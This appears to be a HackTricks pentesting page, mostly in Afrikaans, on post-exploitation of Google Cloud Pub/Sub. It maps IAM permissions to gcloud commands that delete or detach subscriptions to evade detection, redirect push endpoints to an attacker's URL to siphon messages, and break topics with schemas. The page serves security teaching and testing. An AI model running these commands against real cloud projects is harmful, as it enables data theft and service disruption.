# GCP - Pub/Sub Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Pub/Sub

Vir meer inligting oor Pub/Sub, kyk die volgende bladsy:

{{#ref}}
../gcp-services/gcp-pub-sub.md
{{#endref}}

### `pubsub.topics.publish`

Plaas 'n boodskap in 'n topic, nuttig om **onverwagte data te stuur** en onverwante funksies te aktiveer of kwesbaarhede te misbruik:

<details>

<summary>Plaas 'n boodskap in 'n topic</summary>
```bash
# Publish a message in a topic
gcloud pubsub topics publish <topic_name> --message "Hello!"
```
</details>

### `pubsub.topics.detachSubscription`

Nuttig om te verhoed dat 'n subscription boodskappe ontvang, dalk om opsporing te vermy.

<details>

<summary>Detach subscription from topic</summary>
```bash
gcloud pubsub topics detach-subscription <FULL SUBSCRIPTION NAME>
```
</details>

### `pubsub.topics.delete`

Nuttig om te verhoed dat 'n subscription boodskappe ontvang, moontlik om opsporing te vermy.\
Dit is moontlik om 'n topic te verwyder, selfs met subscriptions daaraan gekoppel.

<details>

<summary>Verwyder topic</summary>
```bash
gcloud pubsub topics delete <TOPIC NAME>
```
</details>

### `pubsub.topics.update`

Gebruik hierdie toestemming om 'n instelling van die topic te verander om dit te ontwrig, soos `--clear-schema-settings`, `--message-retention-duration`, `--message-storage-policy-allowed-regions`, `--schema`, `--schema-project`, `--topic-encryption-key`...

### `pubsub.topics.setIamPolicy`

Gee jouself toestemming om enige van die vorige aanvalle uit te voer.

### **`pubsub.subscriptions.create,`**`pubsub.topics.attachSubscription` , (`pubsub.subscriptions.consume`)

Kry al die boodskappe op 'n webbediener:

<details>

<summary>Skep 'n push subscription om boodskappe te ontvang</summary>
```bash
# Crete push subscription and recieve all the messages instantly in your web server
gcloud pubsub subscriptions create <subscription name> --topic <topic name> --push-endpoint https://<URL to push to>
```
</details>

Skep 'n subscription en gebruik dit om **pull messages**:

<details>

<summary>Skep pull subscription en haal messages op</summary>
```bash
# This will retrive a non ACKed message (and won't ACK it)
gcloud pubsub subscriptions create <subscription name> --topic <topic_name>

# You also need pubsub.subscriptions.consume for this
gcloud pubsub subscriptions pull <FULL SUBSCRIPTION NAME>
## This command will wait for a message to be posted
```
</details>

### `pubsub.subscriptions.delete`

**Om 'n subskripsie te verwyder** kan nuttig wees om 'n logverwerkingstelsel of iets soortgelyks te ontwrig:

<details>

<summary>Verwyder subskripsie</summary>
```bash
gcloud pubsub subscriptions delete <FULL SUBSCRIPTION NAME>
```
</details>

### `pubsub.subscriptions.update`

Gebruik hierdie toestemming om 'n instelling by te werk sodat boodskappe op 'n plek gestoor word wat jy kan bereik (URL, Big Query table, Bucket) of net om dit te ontwrig.

<details>

<summary>Bywerk inskrywing-eindpunt</summary>
```bash
gcloud pubsub subscriptions update --push-endpoint <your URL> <subscription-name>
```
</details>

### `pubsub.subscriptions.setIamPolicy`

Gee jouself die permissies wat nodig is om enige van die voorheen genoemde attacks uit te voer.

### `pubsub.schemas.attach`, `pubsub.topics.update`,(`pubsub.schemas.create`)

Attack a schema aan 'n topic sodat die messages dit nie vervul nie en gevolglik die topic ontwrig word.\ If daar geen schemas is nie, moet jy moontlik een skep.

<details>

<summary>Skep schema-lÃªer en koppel dit aan die topic</summary>
```json:schema.json
{
"namespace": "com.example",
"type": "record",
"name": "Person",
"fields": [
{
"name": "name",
"type": "string"
},
{
"name": "age",
"type": "int"
}
]
}
```

```bash
# Attach new schema
gcloud pubsub topics update projects/<project-name>/topics/<topic-id> \
--schema=projects/<project-name>/schemas/<topic-id> \
--message-encoding=json
```
</details>

### `pubsub.schemas.delete`

Dit mag lyk asof die verwydering van 'n schema jou in staat sal stel om boodskappe te stuur wat nie aan die schema voldoen nie. Omdat die schema egter verwyder sal word, sal geen boodskap eintlik in die topic beland nie. Dit is dus **NUTTELOOS**:

<details>

<summary>Verwyder schema (nie nuttig nie)</summary>
```bash
gcloud pubsub schemas delete <SCHEMA NAME>
```
</details>

### `pubsub.schemas.setIamPolicy`

Gee jouself die toestemmings wat nodig is om enige van die eerder genoemde aanvalle uit te voer.

### `pubsub.snapshots.create`, `pubsub.snapshots.seek`

Dit sal 'n snapshot maak van al die unACKed boodskappe en dit terug in die subskripsie sit. Nie baie nuttig vir 'n aanvaller nie, maar hier is dit:

<details>

<summary>Create snapshot and seek to it</summary>
```bash
gcloud pubsub snapshots create YOUR_SNAPSHOT_NAME \
--subscription=YOUR_SUBSCRIPTION_NAME
gcloud pubsub subscriptions seek YOUR_SUBSCRIPTION_NAME \
--snapshot=YOUR_SNAPSHOT_NAME
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
